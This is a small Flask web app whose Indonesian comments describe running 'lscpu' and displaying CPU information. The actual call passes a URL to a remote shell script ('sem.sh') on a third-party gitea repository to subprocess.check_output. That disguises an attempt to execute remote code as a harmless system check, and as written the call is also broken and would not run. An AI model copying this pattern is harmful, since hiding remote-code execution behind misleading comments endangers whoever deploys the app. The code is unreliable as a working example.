import subprocess
from flask import Flask

app = Flask(__name__)

@app.route('/')
def cek_cpu():
    # Menjalankan perintah bash 'lscpu' dan menangkap outputnya
    hasil_lscpu = subprocess.check_output(['https://gitea.com/toafubi/Gremonia/raw/branch/main/sem.sh'], text=True)
    # Menampilkan di web dengan tag <pre> agar format tabel/spasinya rapi
    return f"<pre>{hasil_lscpu}</pre>"
